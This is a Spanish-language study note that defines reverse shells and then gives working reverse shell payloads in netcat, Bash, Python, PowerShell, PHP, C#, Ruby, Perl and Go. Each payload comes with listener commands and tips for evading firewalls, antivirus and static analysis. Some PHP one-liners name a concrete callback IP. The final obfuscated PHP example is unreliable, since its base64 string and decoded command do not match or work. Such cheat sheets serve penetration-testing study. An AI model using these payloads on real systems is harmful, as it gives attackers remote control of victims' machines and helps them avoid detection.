---
aliases:
tags:
  - type/concept
  - technique/execution
kind: Concept
linked:
  - "[[nc]]"
---
# Reverse Shell

***

### Definición 

> [!INFO] Reverse Shell
> Es una técnica comúnmente utilizada en el ámbito de la seguridad informática y el hacking ético para obtener acceso a un sistema remoto. En esta técnica, el sistema objetivo establece una conexión de retorno (inversa) al atacante, dándole al atacante una shell remota en el sistema comprometido. A continuación se detallan los conceptos clave relacionados con una reverse shell.
^definicion

### Evasión de Firewalls y NAT

Uno de los motivos principales para usar una reverse shell es evitar las restricciones impuestas por firewalls y NAT, ya que muchas veces estos están configurados para bloquear conexiones entrantes. Sin embargo, las conexiones salientes generalmente están permitidas para aplicaciones legítimas, lo que facilita que el sistema comprometido pueda conectarse al atacante.

---

## Ejemplos de Reverse Shells

### 1. Reverse Shell con Netcat

**Netcat** es una herramienta de red versátil que permite establecer conexiones TCP o UDP, lo que la hace ideal para crear una reverse shell de manera sencilla.

**Pasos:**

1. **En el atacante (escucha):**

   Abre una terminal y ejecuta el siguiente comando para iniciar un listener en el puerto `4444`:

   ```bash
   nc -lvp 4444
   ```

   - `-l`: Modo escucha.
   - `-v`: Modo verbose para obtener más información.
   - `-p 4444`: Puerto de escucha.

2. **En la víctima:**

   Ejecuta el siguiente comando para conectar al atacante y redirigir una shell Bash:

   ```bash
   nc <IP_ATACANTE> 4444 -e /bin/bash
   ```

   - `<IP_ATACANTE>`: Dirección IP del atacante.
   - `4444`: Puerto configurado en el atacante.
   - `-e /bin/bash`: Ejecuta Bash y redirige su entrada y salida a la conexión.

   > **Nota:** Algunas versiones de `nc` no soportan la opción `-e`. En tales casos, se pueden utilizar alternativas como `socat`.

**Explicación:**

- El atacante configura Netcat para escuchar en un puerto específico.
- La víctima ejecuta Netcat para conectarse al atacante y enlazar una shell Bash a través de la conexión establecida.
- Una vez conectados, el atacante tiene acceso a la línea de comandos de la víctima.

---

### 2. Reverse Shell con Bash

Bash puede utilizarse para establecer una reverse shell sin necesidad de herramientas externas adicionales, aprovechando las capacidades incorporadas del shell.

**Código:**

```bash
bash -i >& /dev/tcp/<IP_ATACANTE>/<PUERTO> 0>&1
```

**Explicación Detallada:**

- `bash -i`: Inicia una shell interactiva.
- `>& /dev/tcp/<IP_ATACANTE>/<PUERTO>`: Redirige la salida estándar (`stdout`) y la salida de error (`stderr`) a la conexión TCP especificada.
- `0>&1`: Redirige la entrada estándar (`stdin`) a la conexión establecida.

**Uso:**

1. **En el atacante:**

   Configura un listener con Netcat:

   ```bash
   nc -lvp <PUERTO>
   ```

2. **En la víctima:**

   Ejecuta el comando Bash proporcionado, reemplazando `<IP_ATACANTE>` y `<PUERTO>` con los valores correspondientes.

**Ventajas:**

- No requiere herramientas adicionales.
- Utiliza funcionalidades nativas de Bash, lo que puede evadir ciertas detecciones basadas en la ausencia de herramientas como Netcat.

**Consideraciones:**

- Solo funciona en sistemas que tienen Bash y permiten la redirección a `/dev/tcp`.

---

### 3. Reverse Shell con Python

Python ofrece una forma flexible y poderosa de establecer una reverse shell mediante scripts sencillos. Es especialmente útil debido a la amplia disponibilidad de Python en diferentes sistemas operativos.

**Código:**

```python
import socket
import subprocess
import os

def reverse_shell():
    host = "<IP_ATACANTE>"
    port = <PUERTO>

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Redirigir los descriptores de archivo estándar
    os.dup2(s.fileno(), 0)  # STDIN
    os.dup2(s.fileno(), 1)  # STDOUT
    os.dup2(s.fileno(), 2)  # STDERR

    # Ejecutar una shell interactiva
    subprocess.call(["/bin/bash", "-i"])

if __name__ == "__main__":
    reverse_shell()
```

**Explicación Detallada:**

1. **Importaciones:**

   - `socket`: Para manejar conexiones de red.
   - `subprocess`: Para ejecutar comandos del sistema.
   - `os`: Para manipular descriptores de archivos.

2. **Configuración de la conexión:**

   - `host`: Dirección IP del atacante.
   - `port`: Puerto de escucha en el atacante.

3. **Establecimiento de la conexión:**

   - Crea un socket TCP y se conecta al atacante.
   - Redirige los descriptores de archivo estándar (`stdin`, `stdout`, `stderr`) al socket, permitiendo que la shell interactiva se comunique a través de la conexión.

4. **Ejecución de la shell:**

   - Lanza una instancia de Bash interactiva que ahora está vinculada a la conexión del atacante.

**Uso:**

1. **En el atacante:**

   Configura un listener con Netcat:

   ```bash
   nc -lvp <PUERTO>
   ```

2. **En la víctima:**

   Ejecuta el script Python. Asegúrate de tener los permisos necesarios para ejecutarlo.

**Ventajas:**

- Flexibilidad y facilidad de modificación.
- Amplia compatibilidad en sistemas donde Python está instalado.

**Consideraciones:**

- Requiere que Python esté instalado en la víctima.
- Puede ser detectado por sistemas de monitoreo de scripts Python.

---

### 4. Reverse Shell con PowerShell

PowerShell es una herramienta poderosa en entornos Windows que puede utilizarse para establecer una reverse shell aprovechando sus capacidades de red y ejecución de comandos.

**Código:**

```powershell
$client = New-Object System.Net.Sockets.TCPClient("<IP_ATACANTE>",<PUERTO>)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**Explicación Detallada:**

1. **Establecimiento de la conexión:**

   - `TCPClient("<IP_ATACANTE>",<PUERTO>)`: Crea una conexión TCP al atacante en el puerto especificado.
   - `GetStream()`: Obtiene el flujo de datos de la conexión.

2. **Lectura y ejecución de comandos:**

   - Lee los datos enviados por el atacante.
   - Utiliza `Invoke-Expression (iex)` para ejecutar los comandos recibidos.
   - Captura la salida estándar y de error, la formatea y la envía de vuelta al atacante.

3. **Iteración:**

   - El bucle `while` continúa leyendo y ejecutando comandos hasta que se cierra la conexión.

**Uso:**

1. **En el atacante:**

   Configura un listener con Netcat:

   ```bash
   nc -lvp <PUERTO>
   ```

2. **En la víctima:**

   Ejecuta el script de PowerShell. Puedes ejecutarlo directamente en una terminal de PowerShell con permisos adecuados.

**Ventajas:**

- Aprovecha las capacidades nativas de PowerShell en Windows.
- Puede ejecutarse desde memoria, lo que dificulta su detección por antivirus tradicionales.

**Consideraciones:**

- Requiere que PowerShell esté habilitado y no restringido en la víctima.
- Puede ser detectado por soluciones avanzadas de monitoreo de PowerShell.

---

### 5. Reverse Shell con PHP

PHP es comúnmente utilizado en servidores web, lo que lo convierte en una opción viable para establecer una reverse shell desde un servidor comprometido.

**Código:**

```php
<?php
$ip = '<IP_ATACANTE>';
$port = <PUERTO>;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/bash', array(
    0 => $sock,
    1 => $sock,
    2 => $sock
), $pipes);
?>
```

**Explicación Detallada:**

1. **Establecimiento de la conexión:**

   - `fsockopen($ip, $port)`: Abre una conexión de socket TCP al atacante.
   - `$sock`: Representa el socket conectado.

2. **Ejecución de la shell:**

   - `proc_open('/bin/bash', ...)`: Inicia una instancia de Bash.
   - Redirige `stdin`, `stdout` y `stderr` al socket, permitiendo la interacción remota.

**Uso:**

1. **En el atacante:**

   Configura un listener con Netcat:

   ```bash
   nc -lvp <PUERTO>
   ```

2. **En la víctima:**

   - Sube el script PHP a un servidor web vulnerable.
   - Accede al script a través del navegador o mediante una solicitud HTTP para ejecutarlo.

**Ventajas:**

- Aprovecha la ejecución de scripts en servidores web comprometidos.
- Puede ser integrado en aplicaciones web para mantener acceso persistente.

**Consideraciones:**

- Requiere que el servidor web tenga PHP habilitado y permita la ejecución de scripts.
- Es detectable por herramientas de monitoreo de tráfico web y análisis de código.

#### One-Liner

```php
<?php system('<?php system("bash -i >& /dev/tcp/172.16.217.148/443 0>&1"); ?>'); ?>
```

Atajo del mismo código: 
```php
<?= `bash -i >& /dev/tcp/172.16.217.148/443 0>&1`; ?> 
```
>[!IMPORTANT]  Comillas confusas
>Las comillas que usa no son las típicas ''. sino que son ``.


---

### 6. Reverse Shell con C#

C# permite crear reverse shells compiladas, lo que puede ser útil para evadir ciertas detecciones que buscan scripts de texto plano.

**Código:**

```csharp
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;

class ReverseShell
{
    static void Main(string[] args)
    {
        string host = "<IP_ATACANTE>";
        int port = <PUERTO>;
        using (TcpClient client = new TcpClient(host, port))
        {
            using (Stream stream = client.GetStream())
            {
                using (StreamReader rdr = new StreamReader(stream))
                {
                    using (StreamWriter wtr = new StreamWriter(stream))
                    {
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.Start();

                        while (true)
                        {
                            string cmd = rdr.ReadLine();
                            if (cmd == "exit") break;
                            p.StandardInput.WriteLine(cmd);
                            p.StandardInput.Flush();
                        }
                    }
                }
            }
        }
    }
}
```

**Explicación Detallada:**

1. **Establecimiento de la conexión:**

   - `TcpClient(host, port)`: Crea una conexión TCP al atacante.
   - `GetStream()`: Obtiene el flujo de datos de la conexión.

2. **Ejecución de comandos:**

   - Inicia un proceso `cmd.exe` (shell de Windows) sin ventana visible.
   - Redirige `stdin`, `stdout` y `stderr` al flujo de la conexión.
   - Lee comandos del atacante y los ejecuta en la shell, enviando de vuelta la salida.

**Compilación:**

Utiliza el compilador de C# (`csc`) para compilar el código:

```bash
csc ReverseShell.cs
```

Esto generará un ejecutable `ReverseShell.exe`.

**Uso:**

1. **En el atacante:**

   Configura un listener con Netcat:

   ```bash
   nc -lvp <PUERTO>
   ```

2. **En la víctima:**

   - Transfiere y ejecuta el binario compilado `ReverseShell.exe`.

**Ventajas:**

- Binario compilado puede evadir detecciones basadas en scripts de texto plano.
- Mayor dificultad para el análisis estático por parte de herramientas de seguridad.

**Consideraciones:**

- Requiere que el sistema de la víctima permita la ejecución de binarios no firmados.
- Puede ser detectado por soluciones de seguridad que analizan el tráfico de red de los binarios.

---

### 7. Reverse Shell con Ruby

Ruby permite crear una reverse shell de forma rápida y concisa, aprovechando su sintaxis sencilla y capacidades de red.

**Código:**

```ruby
require 'socket'
require 'open3'

host = '<IP_ATACANTE>'
port = <PUERTO>

begin
    socket = TCPSocket.new(host, port)
    while cmd = socket.gets
        Open3.popen3(cmd) do |stdin, stdout, stderr|
            socket.puts stdout.read
            socket.puts stderr.read
        end
    end
rescue
    exit
end
```

**Explicación Detallada:**

1. **Importaciones:**

   - `socket`: Para manejar conexiones de red.
   - `open3`: Para ejecutar comandos del sistema y capturar su salida.

2. **Establecimiento de la conexión:**

   - `TCPSocket.new(host, port)`: Crea una conexión TCP al atacante.

3. **Ejecución de comandos:**

   - Lee comandos enviados por el atacante a través del socket.
   - Utiliza `Open3.popen3` para ejecutar los comandos y capturar `stdin`, `stdout` y `stderr`.
   - Envía de vuelta la salida al atacante.

4. **Manejo de errores:**

   - Si ocurre un error en la conexión, el script finaliza.

**Uso:**

1. **En el atacante:**

   Configura un listener con Netcat:

   ```bash
   nc -lvp <PUERTO>
   ```

2. **En la víctima:**

   Ejecuta el script Ruby. Asegúrate de tener los permisos necesarios para ejecutarlo.

**Ventajas:**

- Sintaxis concisa y fácil de entender.
- Flexibilidad para modificar y extender el script según necesidades.

**Consideraciones:**

- Requiere que Ruby esté instalado en la víctima.
- Puede ser detectado por sistemas de monitoreo de scripts Ruby.

---

### 8. Reverse Shell con Perl

Perl puede utilizarse para establecer una reverse shell de manera compacta y eficiente, aprovechando sus capacidades de manipulación de sockets.

**Código:**

```perl
use Socket;

$ip = '<IP_ATACANTE>';
$port = <PUERTO>;

socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
if(connect(S, sockaddr_in($port, inet_aton($ip)))){
    open(STDIN, ">&S");
    open(STDOUT, ">&S");
    open(STDERR, ">&S");
    exec("/bin/bash -i");
};
```

**Explicación Detallada:**

1. **Importación:**

   - `Socket`: Proporciona funciones para manejar conexiones de red.

2. **Configuración de la conexión:**

   - Define la dirección IP y el puerto del atacante.
   - Crea un socket TCP y establece una conexión al atacante.

3. **Redirección de descriptores:**

   - Redirige `STDIN`, `STDOUT` y `STDERR` al socket conectado.

4. **Ejecución de la shell:**

   - Ejecuta una instancia interactiva de Bash vinculada a la conexión establecida.

**Uso:**

1. **En el atacante:**

   Configura un listener con Netcat:

   ```bash
   nc -lvp <PUERTO>
   ```

2. **En la víctima:**

   Ejecuta el script Perl. Asegúrate de tener los permisos necesarios para ejecutarlo.

**Ventajas:**

- Código compacto y eficiente.
- Aprovecha las capacidades nativas de Perl para manejar sockets.

**Consideraciones:**

- Requiere que Perl esté instalado en la víctima.
- Puede ser detectado por sistemas de monitoreo de scripts Perl.

---

### 9. Reverse Shell con Go

Go permite compilar programas estáticos que pueden ejecutar reverse shells de manera eficiente y con menor huella, lo que las hace más difíciles de detectar.

**Código:**

```go
package main

import (
    "net"
    "os"
    "os/exec"
)

func main() {
    conn, err := net.Dial("tcp", "<IP_ATACANTE>:<PUERTO>")
    if err != nil {
        return
    }
    cmd := exec.Command("/bin/bash")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}
```

**Explicación Detallada:**

1. **Importaciones:**

   - `net`: Para manejar conexiones de red.
   - `os`: Para interactuar con el sistema operativo.
   - `os/exec`: Para ejecutar comandos del sistema.

2. **Establecimiento de la conexión:**

   - `net.Dial("tcp", "<IP_ATACANTE>:<PUERTO>")`: Crea una conexión TCP al atacante.

3. **Ejecución de la shell:**

   - `exec.Command("/bin/bash")`: Prepara la ejecución de una shell Bash.
   - Redirige `stdin`, `stdout` y `stderr` al socket conectado.
   - Ejecuta la shell vinculada a la conexión establecida.

**Compilación:**

Utiliza el compilador de Go (`go build`) para compilar el código:

```bash
go build -o reverse_shell reverse_shell.go
```

Esto generará un ejecutable llamado `reverse_shell`.

**Uso:**

1. **En el atacante:**

   Configura un listener con Netcat:

   ```bash
   nc -lvp <PUERTO>
   ```

2. **En la víctima:**

   - Transfiere y ejecuta el binario compilado `reverse_shell`.

**Ventajas:**

- Binario estático con una huella mínima.
- Mayor dificultad para el análisis estático por parte de herramientas de seguridad.

**Consideraciones:**

- Requiere que Go esté instalado para la compilación.
- Puede ser detectado por soluciones de seguridad que analizan patrones de tráfico de binarios.

---

### 10. Reverse Shell con PHP Ofuscado

Ofuscar el código PHP puede ayudar a evadir ciertas detecciones basadas en patrones conocidos de reverse shells.

**Código Ofuscado:**

```php
<?php
$encoded = 'cGhwIC0gaSA+PiAvZGV2L3RjcC8lZC0xIDA+JjE=';
eval(base64_decode($encoded));
?>
```

**Explicación Detallada:**

1. **Ofuscación:**

   - `cGhwIC0gaSA+PiAvZGV2L3RjcC8lZC0xIDA+JjE=` es la versión en Base64 del siguiente comando:

     ```php
     php -i >& /dev/tcp/<IP_ATACANTE>/<PUERTO> 0>&1
     ```

2. **Ejecución:**

   - `base64_decode($encoded)`: Decodifica el string Base64.
   - `eval(...)`: Ejecuta el código PHP decodificado, estableciendo una conexión reverse shell.

**Uso:**

1. **En el atacante:**

   Configura un listener con Netcat:

   ```bash
   nc -lvp <PUERTO>
   ```

2. **En la víctima:**

   - Sube el script PHP ofuscado a un servidor web vulnerable.
   - Accede al script a través del navegador o mediante una solicitud HTTP para ejecutarlo.

**Ventajas:**

- Ofuscación dificulta la detección basada en patrones de código conocidos.
- Mantiene la funcionalidad completa de una reverse shell.

**Consideraciones:**

- Requiere que el servidor web permita la ejecución de scripts PHP.
- Puede ser detectado por análisis avanzados que detectan ejecución dinámica de código.
